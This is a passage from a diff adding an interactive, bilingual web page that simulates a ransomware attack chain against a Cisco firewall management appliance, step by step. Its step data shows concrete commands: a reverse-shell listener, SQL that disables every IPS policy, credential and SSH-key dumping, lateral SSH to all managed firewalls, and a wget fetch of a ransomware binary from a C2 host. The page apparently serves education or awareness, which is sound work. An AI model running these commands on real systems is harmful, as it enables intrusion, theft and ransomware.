+    explain: 'The exploit requires zero credentials, zero prior access. A single HTTP request is sufficient. Web application firewalls without Java deserialization signatures will pass the traffic as a normal API call.'
+  },
+  {
+    node: 2, conn: 1, connType: 'active', nodeType: 'active',
+    stepLabel: 'STEP 3 \u2014 Java Deserialization \u2192 Root Shell',
+    stepLabelTR: 'ADIM 3 \u2014 Java Deserialization \u2192 Root Shell',
+    text: 'FMC\'s JVM deserializes the CommonsCollections gadget chain, triggering Runtime.exec() which spawns /bin/bash as root. The reverse shell connects back to the attacker\'s listener on port 4444.',
+    textTR: 'FMC\'nin JVM\'i, Runtime.exec()\'i tetikleyen CommonsCollections gadget zincirini deserialize eder ve root olarak /bin/bash ba\u015flat\u0131r. Ters shell sald\u0131rgan\u0131n 4444 portundaki dinleyicisine geri ba\u011flan\u0131r.',
+    cmd: '# On attacker machine — waiting for callback\nnc -lvnp 4444\n\n# Shell arrives:\nListening on 0.0.0.0 4444\nConnection received on TARGET 52341\nbash: no job control in this shell\n[root@fmc-appliance /]# id\nuid=0(root) gid=0(root) groups=0(root)\n[root@fmc-appliance /]# hostname\ncisco-fmc-prod\n# Full root shell — FMC completely compromised',
+    explain: 'FMC runs its Java management services as root for legacy compatibility reasons. This means deserialization immediately yields root — no local privilege escalation step needed. Standard EDR agents are not present on FMC appliances.'
+  },
+  {
+    node: 3, conn: 2, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 4 \u2014 IDS/IPS Disabled via FMC Database',
+    stepLabelTR: 'ADIM 4 \u2014 FMC Veritaban\u0131 ile IDS/IPS Devre D\u0131\u015f\u0131',
+    text: 'With root access, attacker connects directly to the FMC MySQL database and disables all IPS/IDS policies across all managed firewalls. This removes all network-level detection from the entire environment.',
+    textTR: 'Root eri\u015fimiyle sald\u0131rgan, FMC MySQL veritaban\u0131na do\u011frudan ba\u011flan\u0131r ve t\u00fcm y\u00f6netilen g\u00fcvenlik duvarlar\u0131ndaki t\u00fcm IPS/IDS politikalar\u0131n\u0131 devre d\u0131\u015f\u0131 b\u0131rak\u0131r.',
+    cmd: '# Connect to FMC internal MySQL\nmysql -u root -p$(cat /etc/sf/.passwd) sfdb\n\n-- Disable ALL IPS policies on ALL managed devices\nUPDATE intrusion_policy SET enabled=0 WHERE 1=1;\nUPDATE access_control_policy SET ips_policy_id=NULL;\n\n-- Verify: all network sensors now blind\nSELECT device_name, ips_policy_id FROM managed_devices;\n-- ips_policy_id = NULL across all rows\n# Network security monitoring is now completely offline',
+    explain: 'Direct database manipulation bypasses FMC\'s audit logging (which only records API-level changes, not direct DB writes). From this moment, the attacker can conduct lateral movement and exfiltration without triggering any network IDS/IPS alerts.'
+  },
+  {
+    node: 4, conn: 3, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 5 \u2014 Credential Harvest + Lateral Movement',
+    stepLabelTR: 'ADIM 5 \u2014 Kimlik Bilgisi Toplama + Yanal Hareket',
+    text: 'Attacker dumps all managed device credentials and SSH keys stored by FMC. Uses these to pivot to all managed Cisco ASA/FTD firewalls and internal network segments. Network architecture data is exfiltrated.',
+    textTR: 'Sald\u0131rgan, FMC taraf\u0131ndan depolanan t\u00fcm y\u00f6netilen cihaz kimlik bilgilerini ve SSH anahtarlar\u0131n\u0131 d\u00f6k\u00fcmler. Bunlar\u0131 t\u00fcm y\u00f6netilen Cisco ASA/FTD g\u00fcvenlik duvarlar\u0131na ve dahili a\u011f segmentlerine pivot yapmak i\u00e7in kullan\u0131r.',
+    cmd: '# Dump device credentials from FMC DB\nmysql -u root sfdb -e \\\n  "SELECT device_name, username, password FROM device_registry"\n\n# Extract SSH keys\ncat /var/sf/database/ssh_keys/*\n\n# Lateral movement to all managed FTDs\nfor ip in $(mysql sfdb -e "SELECT mgmt_ip FROM managed_devices" -B --skip-column-names); do\n  ssh -i /var/sf/database/ssh_keys/fmc_key admin@$ip\ndone\n# Access to entire managed firewall estate',
+    explain: 'FMC must store credentials for its managed devices to function as a central management platform. These credentials are necessarily accessible to root on the FMC appliance — this is a fundamental architectural risk of centralized management.'
+  },
+  {
+    node: 5, conn: 4, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 6 \u2014 Interlock Ransomware Deployed',
+    stepLabelTR: 'ADIM 6 \u2014 Interlock Fid\u00fce Yaz\u0131l\u0131m\u0131 Da\u011f\u0131t\u0131ld\u0131',
+    text: 'Interlock deploys FreeBSD/Linux ransomware binary to FMC. Encrypts the FMC configuration database (sfconfig.db) making all managed firewalls unmanageable. Windows variant deployed to lateral systems. Double-extortion note dropped.',
+    textTR: 'Interlock, FMC\'ye FreeBSD/Linux fid\u00fce yaz\u0131l\u0131m\u0131 binary\'si konuşlandırır. T\u00fcm y\u00f6netilen g\u00fcvenlik duvarlar\u0131n\u0131 y\u00f6netilemez hale getiren FMC yap\u0131land\u0131rma veritaban\u0131n\u0131 (sfconfig.db) \u015fifreler.',
+    cmd: '# Deploy Interlock ransomware binary\nwget http://C2/interlock_linux -O /tmp/.sys && chmod +x /tmp/.sys\n/tmp/.sys --target /var/sf/database/ --key INTERLOCK_KEY\n\n# Result:\nls /var/sf/database/\nsfconfig.db.interlock   # FMC config DB encrypted\nREADME_INTERLOCK.txt    # Extortion note\n\n# From initial POST to encryption: 3h 47m\n# All managed firewalls: unmanageable\n# Entire network: security controls offline',
+    explain: 'Ransomware on FMC has a multiplier effect — encrypting a single appliance renders the entire managed firewall estate non-functional. Recovery requires FMC rebuild from backup + manual reconfiguration of all managed devices.'
+  }
+];
+
+let _atvIdx  = -1;
+let _atvTimer = null;
+let _atvAuto  = false;
+
+function atvReset() {
+  clearTimeout(_atvTimer);
+  _atvIdx  = -1;
+  _atvAuto = false;
+  ATV_NODES.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.classList.remove('active','pwned','safe');
+  });
+  ATV_CONNS.forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.classList.remove('active','danger');
+    const pkt = el.querySelector('.atk-pkt');
+    if (pkt) pkt.classList.remove('run');
+  });
+  document.querySelectorAll('.atk-dot').forEach(d => d.className = 'atk-dot');
+  const detStep = document.getElementById('atkDetailStep');
+  const detText = document.getElementById('atkDetailText');
+  if (detStep) detStep.textContent = '\u25ba SIMULATION READY';
+  if (detText) detText.textContent = 'Press AUTO to run the full attack chain automatically, or use STEP to advance manually. Click any node or dot to jump to that step.';
+  const expl = document.getElementById('atkExplain');
+  if (expl) expl.style.display = 'none';
+  const cmdEl = document.querySelector('.atk-detail-cmd');
+  if (cmdEl) cmdEl.remove();
+  document.getElementById('atkProgLabel').textContent = '0 / ' + ATV_STEPS.length;
+  const autoBtn = document.getElementById('atkPlayBtn');
+  if (autoBtn) { autoBtn.textContent = '\u25b6 AUTO'; autoBtn.disabled = false; autoBtn.onclick = atvRun; }
+}
+
+function atvRender(idx) {
+  const s = ATV_STEPS[idx];
+  const useTR = (_lang === 'tr');
+
+  document.querySelectorAll('.atk-pkt').forEach(p => { p.classList.remove('run'); void p.offsetWidth; });
+
+  ATV_NODES.forEach((id, i) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.classList.remove('active','pwned','safe');
+    if (i === s.node) el.classList.add(s.nodeType || 'active');
+    else if (i < s.node) el.classList.add('safe');
+  });
+
+  ATV_CONNS.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.classList.remove('active','danger');
+  });
+  if (s.conn !== null) {
+    const cEl = document.getElementById(ATV_CONNS[s.conn]);
+    if (cEl) {
+      cEl.classList.add(s.connType);
+      const pkt = cEl.querySelector('.atk-pkt');
+      if (pkt) {
+        pkt.className = 'atk-pkt ' + (s.connType === 'danger' ? 'red' : 'orange');
+        setTimeout(() => pkt.classList.add('run'), 80);
+      }
+    }
+  }
+
+  const stepLabel = useTR ? s.stepLabelTR : s.stepLabel;
+  const text = useTR ? s.textTR : s.text;
+  document.getElementById('atkDetailStep').textContent = stepLabel;
+  document.getElementById('atkDetailText').textContent = text;
+
+  const expl = document.getElementById('atkExplain');
+  const explText = document.getElementById('atkExplainText');
+  if (s.explain && expl && explText) {
+    explText.textContent = s.explain;
+    expl.style.display = 'block';
+  } else if (expl) {
+    expl.style.display = 'none';
+  }
+
+  const detail = document.getElementById('atkDetail');
+  const existing = detail.querySelector('.atk-detail-cmd');
+  if (existing) existing.remove();
+  if (s.cmd) {
+    const cmdDiv = document.createElement('div');
+    cmdDiv.className = 'atk-detail-cmd';
+    const pre = document.createElement('pre');
+    pre.style.cssText = 'margin:0;white-space:pre-wrap;font-size:0.7rem';
+    pre.textContent = s.cmd;
+    cmdDiv.appendChild(pre);
+    detail.appendChild(cmdDiv);
+  }
+
+  document.querySelectorAll('.atk-dot').forEach((d, i) => {
+    d.className = 'atk-dot' + (i < idx ? ' done' : i === idx ? ' current' : '');
+  });
+  document.getElementById('atkProgLabel').textContent = (idx + 1) + ' / ' + ATV_STEPS.length;
+}
+
+function atvGoTo(idx) {
+  clearTimeout(_atvTimer);
+  _atvAuto = false;
+  const autoBtn = document.getElementById('atkPlayBtn');
+  if (autoBtn) { autoBtn.textContent = '\u25b6 AUTO'; autoBtn.disabled = false; autoBtn.onclick = atvRun; }
+
+  if (idx < 0) { atvReset(); return; }
+  if (idx >= ATV_STEPS.length) {
+    const autoBtn2 = document.getElementById('atkPlayBtn');
+    if (autoBtn2) { autoBtn2.textContent = '\u21ba Reset'; autoBtn2.onclick = atvReset; }
+    return;
+  }
+  _atvIdx = idx;
+  atvRender(idx);
+}
+
+function atvRun() {
+  _atvAuto = true;
+  const autoBtn = document.getElementById('atkPlayBtn');
+  if (autoBtn) { autoBtn.disabled = true; }
+  atvGoTo(_atvIdx + 1);
+  if (_atvIdx < ATV_STEPS.length - 1) {
+    _atvTimer = setTimeout(atvRun, 2600);
+  } else {
+    _atvAuto = false;
+    if (autoBtn) { autoBtn.textContent = '\u21ba Reset'; autoBtn.disabled = false; autoBtn.onclick = atvReset; }
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   INIT
+═══════════════════════════════════════════════════════════════ */
+applyTheme(_theme);
+applyLang(_lang);
+</script>
+</body>
+</html>
